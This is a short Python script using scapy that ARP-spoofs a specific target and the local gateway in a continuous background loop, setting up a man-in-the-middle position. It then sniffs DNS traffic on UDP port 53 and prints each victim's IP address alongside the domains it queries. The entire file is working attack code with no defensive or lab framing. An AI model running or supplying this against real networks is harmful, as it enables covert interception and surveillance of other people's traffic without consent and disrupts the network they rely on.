import logging
from scapy.all import ARP, send, sniff
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP
import threading
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip,
                 hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip)
    send(packet, verbose=False)
    # ARP => ARP Request | ARP Replay
    # op => option => 1,2
    # pdst => protocol distination
    # hwdst => Harddware distination => Mac adresse | Broadcast
    # psrc => protocol source


def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ip_src = packet[IP].src
        dns_query = packet[DNSQR].qname.decode()
        print(f"{ip_src:<15}\t{dns_query:<30}")


def start_arp(target_ip, gateway_ip):
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof(gateway_ip, target_ip)
        time.sleep(2)  # un délai pour éviter la surcharge


target_ip = "192.168.1.7"  # Utilisez une IP spécifique de la cible
gateway_ip = "192.168.1.1"

threading.Thread(target=start_arp, args=(
    target_ip, gateway_ip), daemon=True).start()

print(f"[+] Network Traffic : 2025")
print("-" * 40)
print(f"{'IP Address':<15}\t{'DNS Query':<30}")
print("-" * 40)
sniff(filter="udp port 53", prn=dns_packet, store=0)
